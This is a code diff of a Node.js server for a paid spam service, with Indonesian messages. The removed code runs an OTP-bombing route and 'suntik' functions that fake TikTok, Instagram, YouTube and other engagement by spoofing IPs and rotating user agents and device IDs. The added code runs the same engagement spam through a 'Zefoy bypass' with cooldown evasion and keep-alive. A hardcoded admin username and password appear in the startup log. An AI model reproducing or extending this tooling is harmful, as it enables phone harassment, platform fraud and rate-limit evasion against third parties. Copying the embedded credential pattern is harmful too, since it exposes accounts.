-        await sleep(500 + Math.random() * 1000);
-    }
-    
-    // Fallback: Multiple methods
-    if (!success) {
-        success = await fallbackSuntik(targetId, platform, action, count);
-        if (success) serviceUsed = 'Fallback API';
-    }
-    
-    return { success, serviceUsed, methodUsed };
-}
-
-async function tryApiSuntik(service, target, platform, action, count) {
-    try {
-        const endpoints = [
-            `${service.baseUrl}/api/${platform.toLowerCase()}/${action.toLowerCase()}`,
-            `${service.baseUrl}/api/v1/${platform.toLowerCase()}/${action.toLowerCase()}`,
-            `${service.baseUrl}/api/${platform.toLowerCase()}/add`,
-            `${service.baseUrl}/api/v1/${platform.toLowerCase()}/add`
-        ];
-        
-        for (const endpoint of endpoints) {
-            try {
-                const response = await fetch(endpoint, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'User-Agent': getRandomUserAgent(),
-                        'Accept': 'application/json',
-                        'Origin': service.baseUrl,
-                        'Referer': service.baseUrl + '/',
-                        'X-Forwarded-For': getRandomIP(),
-                        'X-Device-ID': generateDeviceId(),
-                        'X-Session-ID': generateRandomString(16)
-                    },
-                    body: JSON.stringify({
-                        target: target,
-                        count: count || 1,
-                        service: action.toLowerCase(),
-                        device_id: generateDeviceId(),
-                        timestamp: Date.now(),
-                        platform: platform,
-                        action: action,
-                        user_agent: getRandomUserAgent(),
-                        ip: getRandomIP()
-                    }),
-                    timeout: 15000
-                });
-                
-                const text = await response.text();
-                
-                try {
-                    const json = JSON.parse(text);
-                    if (json.status === 'success' || json.success === true || json.code === 0 || json.code === 200) {
-                        return true;
-                    }
-                    // Check if it's a success response
-                    if (json.message && (json.message.includes('success') || json.message.includes('berhasil'))) {
-                        return true;
-                    }
-                } catch (e) {
-                    if (response.status === 200 || response.status === 201 || response.status === 202) {
-                        return true;
-                    }
-                }
-            } catch (e) {
-                continue;
-            }
-        }
-        return false;
-    } catch (e) {
-        return false;
-    }
-}
-
-async function tryDirectSuntik(service, target, platform, action, count) {
-    try {
-        // Simulate direct API call
-        const directUrl = `${service.baseUrl}/direct/${platform}/${action}`;
-        const response = await fetch(directUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': getRandomUserAgent(),
-                'X-Forwarded-For': getRandomIP()
-            },
-            body: `target=${encodeURIComponent(target)}&count=${count || 1}`,
-            timeout: 10000
-        });
-        
-        return response.status === 200 || response.status === 201 || response.status === 202;
-    } catch (e) {
-        return false;
-    }
-}
-
-async function fallbackSuntik(target, platform, action, count) {
-    try {
-        // Try multiple fallback endpoints
-        const fallbackUrls = [
-            `https://api.${platform.toLowerCase()}.com/v1/${action.toLowerCase()}?target=${encodeURIComponent(target)}`,
-            `https://api.${platform.toLowerCase()}.com/v2/${action.toLowerCase()}?target=${encodeURIComponent(target)}`,
-            `https://www.${platform.toLowerCase()}.com/api/v1/${action.toLowerCase()}?target=${encodeURIComponent(target)}`
-        ];
-        
-        for (const url of fallbackUrls) {
-            try {
-                const response = await fetch(url, {
-                    method: 'GET',
-                    headers: {
-                        'User-Agent': getRandomUserAgent(),
-                        'X-Forwarded-For': getRandomIP(),
-                        'Accept': 'application/json'
-                    },
-                    timeout: 5000
-                });
-                if (response.status === 200) {
-                    return true;
-                }
-            } catch (e) {
-                continue;
-            }
-        }
-        return false;
-    } catch (e) {
-        return false;
-    }
-}
-
 async function spamSuntik(target, platform, action, count, username, sessionId) {
-    const results = { success: 0, failed: 0, details: [], serviceUsed: null, methodUsed: 'api' };
+    const results = { success: 0, failed: 0, total: 0, attempts: 0 };
     let isStopped = false;
-    
+    let cooldownUsed = false;
+    let bypassAttempts = 0;
+    let bypassSuccess = false;
+
     if (!global.spamSessions) global.spamSessions = {};
     global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
-    
-    // Extraksi target untuk TikTok
-    let targetId = target;
-    if (platform === 'TikTok' && target.includes('tiktok.com')) {
-        targetId = extractTikTokUsername(target);
-        console.log(`🔍 Extracted TikTok username: ${targetId}`);
+
+    // Initialize Zefoy if not ready
+    if (!isZefoyReady) {
+        io.emit('spamProgress', {
+            sessionId, type: 'suntik',
+            target, platform, action,
+            current: 0, total: count,
+            success: 0, failed: 0,
+            message: '🔧 Initializing Zefoy bypass...',
+            status: 'init'
+        });
+
+        const initResult = await initZefoy();
+        if (!initResult) {
+            io.emit('spamProgress', {
+                sessionId, type: 'suntik',
+                target, platform, action,
+                current: 0, total: count,
+                success: 0, failed: 0,
+                message: '❌ Failed to initialize Zefoy!',
+                status: 'error',
+                error: 'Zefoy initialization failed'
+            });
+            return { success: 0, failed: count, total: count, attempts: 0, bypassFailed: true };
+        }
     }
-    
+
+    // Check if Zefoy is ready
+    if (!isZefoyReady) {
+        io.emit('spamProgress', {
+            sessionId, type: 'suntik',
+            target, platform, action,
+            current: 0, total: count,
+            success: 0, failed: 0,
+            message: '❌ Zefoy not ready! Please retry.',
+            status: 'error',
+            error: 'Zefoy not ready'
+        });
+        return { success: 0, failed: count, total: count, attempts: 0, bypassFailed: true };
+    }
+
     for (let i = 0; i < count; i++) {
         if (isStopped) {
             io.emit('spamProgress', {
@@ -980,61 +554,181 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
                 target, platform, action,
                 current: i, total: count,
                 success: results.success, failed: results.failed,
-                message: `⛔ Dihentikan!`,
+                message: '⛔ Stopped by user!',
                 stopped: true,
-                serviceUsed: results.serviceUsed,
-                methodUsed: results.methodUsed
+                status: 'stopped'
             });
             break;
         }
-        
-        const result = await aggressiveSuntik(targetId, platform, action, 1);
-        
-        if (result.success) {
-            results.success++;
-            results.serviceUsed = result.serviceUsed || results.serviceUsed;
-            results.methodUsed = result.methodUsed || results.methodUsed;
+
+        // Check cooldown
+        if (zefoyCooldown) {
             io.emit('spamProgress', {
                 sessionId, type: 'suntik',
                 target, platform, action,
-                current: i + 1, total: count,
+                current: i, total: count,
                 success: results.success, failed: results.failed,
-                message: `✅ ${i+1}/${count} Berhasil via ${result.serviceUsed || 'Unknown'} (${result.methodUsed || 'api'})`,
-                serviceUsed: result.serviceUsed,
-                methodUsed: result.methodUsed,
-                serviceDown: false
+                message: '⏳ Cooldown 2 minutes... Please wait',
+                status: 'cooldown',
+                cooldown: true
             });
-        } else {
+            
+            // Wait until cooldown ends
+            while (zefoyCooldown && !isStopped) {
+                await sleep(1000);
+            }
+            
+            if (isStopped) break;
+        }
+
+        // Keep Zefoy alive
+        if (i % 5 === 0 && zefoyInstance) {
+            await zefoyInstance.keepAlive();
+        }
+
+        // Execute service
+        try {
+            const result = await zefoyInstance.useService(platform, action, target, 1);
+            
+            if (result.success) {
+                results.success++;
+                io.emit('spamProgress', {
+                    sessionId, type: 'suntik',
+                    target, platform, action,
+                    current: i + 1, total: count,
+                    success: results.success, failed: results.failed,
+                    message: `✅ ${i+1}/${count} Success! ${platform} ${action}`,
+                    status: 'success',
+                    serviceUsed: 'Zefoy'
+                });
+            } else {
+                results.failed++;
+                io.emit('spamProgress', {
+                    sessionId, type: 'suntik',
+                    target, platform, action,
+                    current: i + 1, total: count,
+                    success: results.success, failed: results.failed,
+                    message: `❌ ${i+1}/${count} Failed: ${result.error || 'Unknown error'}`,
+                    status: 'error',
+                    error: result.error
+                });
+            }
+        } catch (error) {
             results.failed++;
             io.emit('spamProgress', {
                 sessionId, type: 'suntik',
                 target, platform, action,
                 current: i + 1, total: count,
                 success: results.success, failed: results.failed,
-                message: `❌ ${i+1}/${count} Gagal - mencoba ulang...`,
-                serviceUsed: null,
-                methodUsed: null,
-                serviceDown: true
+                message: `❌ ${i+1}/${count} Error: ${error.message}`,
+                status: 'error',
+                error: error.message
             });
         }
-        
-        // Random delay 2-5 detik dengan jitter
-        if (i < count - 1) {
-            const delay = 2000 + Math.random() * 4000;
+
+        results.total = results.success + results.failed;
+        results.attempts = i + 1;
+
+        // Start cooldown after each successful service
+        if (results.success > 0) {
+            zefoyCooldown = true;
+            io.emit('spamProgress', {
+                sessionId, type: 'suntik',
+                target, platform, action,
+                current: i + 1, total: count,
+                success: results.success, failed: results.failed,
+                message: '⏳ Cooldown 2 minutes started...',
+                status: 'cooldown_start',
+                cooldown: true
+            });
+
+            // 2 minute cooldown (120 seconds)
+            let cooldownRemaining = 120;
+            while (cooldownRemaining > 0 && !isStopped) {
+                await sleep(1000);
+                cooldownRemaining--;
+                if (cooldownRemaining % 10 === 0) {
+                    io.emit('spamProgress', {
+                        sessionId, type: 'suntik',
+                        target, platform, action,
+                        current: i + 1, total: count,
+                        success: results.success, failed: results.failed,
+                        message: `⏳ Cooldown: ${cooldownRemaining}s remaining`,
+                        status: 'cooldown',
+                        cooldown: true,
+                        cooldownRemaining: cooldownRemaining
+                    });
+                }
+            }
+            
+            zefoyCooldown = false;
+        }
+
+        // Delay between attempts
+        if (i < count - 1 && !isStopped) {
+            const delay = 2000 + Math.random() * 3000;
             await sleep(delay);
         }
     }
-    
+
+    // Final summary
+    io.emit('spamProgress', {
+        sessionId, type: 'suntik',
+        target, platform, action,
+        current: results.total, total: count,
+        success: results.success, failed: results.failed,
+        message: `📊 Selesai! Berhasil: ${results.success}, Gagal: ${results.failed}`,
+        status: 'completed',
+        completed: true,
+        totalSuccess: results.success,
+        totalFailed: results.failed,
+        totalAttempts: results.attempts
+    });
+
     if (global.spamSessions && global.spamSessions[sessionId]) {
         delete global.spamSessions[sessionId];
     }
-    
+
     return results;
 }
 
 // ============================================
-// API SUNTIK
+// API ROUTES
 // ============================================
+
+// ===== GET PLATFORMS =====
+app.get('/api/suntik/platforms', (req, res) => {
+    try {
+        const platforms = Object.keys(platformConfigs).map(key => ({
+            name: key,
+            icon: platformConfigs[key].icon,
+            color: platformConfigs[key].color,
+            actions: platformConfigs[key].actions.map(action => ({
+                name: action,
+                icon: platformConfigs[key].actionIcons?.[action] || 'fa-circle'
+            }))
+        }));
+        res.json({ success: true, platforms });
+    } catch (err) {
+        res.json({ success: false, platforms: [] });
+    }
+});
+
+// ===== ZEFOY STATUS =====
+app.get('/api/zefoy/status', async (req, res) => {
+    try {
+        res.json({
+            success: true,
+            ready: isZefoyReady,
+            cooldown: zefoyCooldown,
+            connected: zefoyInstance ? zefoyInstance.isConnected : false
+        });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
+});
+
+// ===== SPAM SUNTIK =====
 app.post('/api/spam/suntik', async (req, res) => {
     try {
         const { username, target, platform, action, count } = req.body;
@@ -1048,7 +742,7 @@ app.post('/api/spam/suntik', async (req, res) => {
             return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
         }
         
-        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
+        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP') {
             return res.json({ 
                 success: false, 
                 message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
@@ -1092,13 +786,20 @@ app.post('/api/spam/suntik', async (req, res) => {
             }
         }
 
+        // Check Zefoy
+        if (!isZefoyReady) {
+            const initResult = await initZefoy();
+            if (!initResult) {
+                return res.json({ success: false, message: 'Zefoy initialization failed! Please retry.' });
+            }
+        }
+
         const sessionId = `suntik_${username}_${Date.now()}`;
         const result = await spamSuntik(target, platform, action, count, username, sessionId);
         
         if (result.success > 0) {
             user.used = (user.used || 0) + result.success;
-            // Update stats
-            if (!db.stats) db.stats = { totalOTPSent: 0, totalSuntikSent: 0 };
+            if (!db.stats) db.stats = { totalSuntikSent: 0 };
             db.stats.totalSuntikSent = (db.stats.totalSuntikSent || 0) + result.success;
             saveDB();
             io.emit('userUpdated', { username: user.username });
@@ -1109,10 +810,9 @@ app.post('/api/spam/suntik', async (req, res) => {
             result: {
                 success: result.success,
                 failed: result.failed,
-                total: result.success + result.failed,
-                serviceUsed: result.serviceUsed,
-                methodUsed: result.methodUsed,
-                details: result.details
+                total: result.total || result.success + result.failed,
+                attempts: result.attempts || 0,
+                bypassFailed: result.bypassFailed || false
             }
         });
     } catch (err) {
@@ -1135,128 +835,7 @@ app.post('/api/spam/suntik/stop', (req, res) => {
     }
 });
 
-// ===== STOP SPAM OTP =====
-app.post('/api/spam/otp/stop', (req, res) => {
-    try {
-        const { sessionId } = req.body;
-        if (global.spamSessions && global.spamSessions[sessionId]) {
-            global.spamSessions[sessionId].stop();
-            return res.json({ success: true, message: 'Spam dihentikan!' });
-        }
-        res.json({ success: false, message: 'Session tidak ditemukan!' });
-    } catch (err) {
-        res.json({ success: false, message: err.message });
-    }
-});
-
-// ============================================
-// GET PLATFORMS
-// ============================================
-app.get('/api/suntik/platforms', (req, res) => {
-    try {
-        const platforms = Object.keys(platformConfigs).map(key => ({
-            name: key,
-            icon: platformConfigs[key].icon,
-            color: platformConfigs[key].color,
-            actions: platformConfigs[key].actions.map(action => ({
-                name: action,
-                icon: platformConfigs[key].actionIcons?.[action] || 'fa-circle'
-            })),
-            services: freeSuntikServices.filter(s => s.platforms.includes(key)).map(s => s.name)
-        }));
-        res.json({ success: true, platforms });
-    } catch (err) {
-        res.json({ success: false, platforms: [] });
-    }
-});
-
-// ============================================
-// SPAM OTP ROUTE
-// ============================================
-app.post('/api/spam/otp', async (req, res) => {
-    try {
-        const { username, target, count } = req.body;
-        
-        if (!username) {
-            return res.json({ success: false, message: 'Username tidak ditemukan!' });
-        }
-        
-        const user = db.users.find(u => u.username === username);
-        if (!user) {
-            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
-        }
-        
-        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
-            return res.json({ 
-                success: false, 
-                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
-                maintenance: true
-            });
-        }
-        
-        if (!target) {
-            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
-        }
-        
-        if (!count || count < 1) {
-            return res.json({ success: false, message: 'Jumlah minimal 1!' });
-        }
-        
-        const limits = {
-            'Free': 15,
-            'Premium': 80,
-            'VIP': 150,
-            'Reseller': 200,
-            'Developer': Infinity
-        };
-        
-        const maxLimit = limits[user.status] || 15;
-        
-        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
-            if (count > maxLimit) {
-                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
-            }
-            
-            const remaining = user.limit - (user.used || 0);
-            if (remaining <= 0) {
-                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
-            }
-            if (count > remaining) {
-                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
-            }
-        }
-
-        const sessionId = `otp_${username}_${Date.now()}`;
-        const result = await spamOTP(target, count, username, sessionId);
-        
-        if (result.success > 0) {
-            user.used = (user.used || 0) + result.success;
-            // Update stats
-            if (!db.stats) db.stats = { totalOTPSent: 0, totalSuntikSent: 0 };
-            db.stats.totalOTPSent = (db.stats.totalOTPSent || 0) + result.success;
-            saveDB();
-            io.emit('userUpdated', { username: user.username });
-        }
-        
-        res.json({ 
-            success: true, 
-            result: {
-                success: result.success,
-                failed: result.failed,
-                total: result.success + result.failed,
-                totalAttempts: result.totalAttempts,
-                details: result.details
-            }
-        });
-    } catch (err) {
-        console.error('❌ Error spam OTP:', err);
-        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
-    }
-});
-
-// ============================================
-// AUTH ROUTES
-// ============================================
+// ===== AUTH ROUTES =====
 
 app.post('/api/register', (req, res) => {
     try {
@@ -1380,6 +959,7 @@ app.post('/api/change-password', (req, res) => {
 // ============================================
 // ADMIN API
 // ============================================
+
 app.get('/api/admin/users', (req, res) => {
     try {
         res.json({
@@ -1607,17 +1187,30 @@ setInterval(() => {
     }
 }, 60000);
 
+// ===== KEEP ZEFOY ALIVE =====
+setInterval(async () => {
+    if (zefoyInstance && isZefoyReady) {
+        try {
+            await zefoyInstance.keepAlive();
+            console.log('💓 Zefoy heartbeat');
+        } catch (error) {
+            console.log('⚠️ Zefoy heartbeat failed, reconnecting...');
+            isZefoyReady = false;
+            zefoyInstance = null;
+        }
+    }
+}, 30000);
+
 // ============================================
 // STATS ROUTE
 // ============================================
 app.get('/api/stats', (req, res) => {
     try {
-        if (!db.stats) db.stats = { totalOTPSent: 0, totalSuntikSent: 0 };
+        if (!db.stats) db.stats = { totalSuntikSent: 0 };
         res.json({
             success: true,
             stats: {
                 totalUsers: db.users.length,
-                totalOTPSent: db.stats.totalOTPSent || 0,
                 totalSuntikSent: db.stats.totalSuntikSent || 0,
                 totalPayments: db.payments?.length || 0,
                 onlineUsers: onlineUsers.size
@@ -1636,10 +1229,10 @@ server.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log('========================================');
     console.log('👑 Admin: Lynzka / Asiafone11');
-    console.log('📱 SPAM OTP & SUNTIK SUPER AGGRESSIVE MODE');
+    console.log('💉 SUNTIK SUPER AGGRESSIVE');
     console.log('========================================');
-    console.log(`🔥 ${otpServices.length} API OTP Services`);
-    console.log(`🔥 ${freeSuntikServices.length} Suntik Services`);
+    console.log('🔥 Zefoy Bypass Ready!');
+    console.log('🔥 5 Platform Support');
     console.log('========================================');
     console.log('📊 Limit per status:');
     console.log('   Free     : 15x');
@@ -1648,20 +1241,15 @@ server.listen(PORT, async () => {
     console.log('   Reseller : 200x');
     console.log('   Developer: Unlimited');
     console.log('========================================');
-    console.log('🛡️ SUPER AGGRESSIVE MODE:');
-    console.log('   ✅ Multiple User-Agent Rotations');
-    console.log('   ✅ Random IP Spoofing (X-Forwarded-For)');
-    console.log('   ✅ Dynamic Proxy Support');
-    console.log('   ✅ Exponential Backoff Retry');
-    console.log('   ✅ Random Jitter Delays');
-    console.log('   ✅ Parallel Request Batching');
-    console.log('   ✅ Multiple Method Fallbacks');
-    console.log('   ✅ TikTok URL Support');
-    console.log('========================================');
     console.log('🎯 Platform Support:');
-    console.log('   TikTok, Instagram, YouTube, Facebook');
-    console.log('   Twitter, Telegram, WhatsApp');
+    console.log('   TikTok, Instagram, YouTube, Facebook, Twitter');
     console.log('========================================');
-    console.log('✅ All done!');
+    console.log('⏳ Cooldown: 2 minutes after each success');
     console.log('========================================');
+    console.log('✅ Server siap!');
+    console.log('========================================');
+
+    // Initialize Zefoy
+    console.log('🔄 Initializing Zefoy...');
+    await initZefoy();
 });
